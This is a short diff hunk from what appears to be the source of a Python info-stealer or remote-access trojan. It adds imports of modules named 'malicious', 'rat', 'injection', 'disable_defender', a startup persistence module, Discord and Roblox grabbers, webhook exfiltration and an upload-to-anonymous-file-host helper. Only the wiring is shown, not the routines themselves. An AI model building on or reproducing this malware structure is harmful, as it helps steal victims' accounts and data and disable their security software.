@@ -42,6 +42,17 @@ try:
 except Exception:
     requirementsinstallation()
 
+import _webhook
+import discordc
+import informations
+import malicious
+import rat
+import injection
+from config import Config
+from _roblox import RobloxX
+from anonFile import uploadToAnonfiles
+from startup import StartUp
+from disable_defender import disabledefender
 ii = informations.Info()
 _webh = _webhook.WebhookX()
 cc = Config()
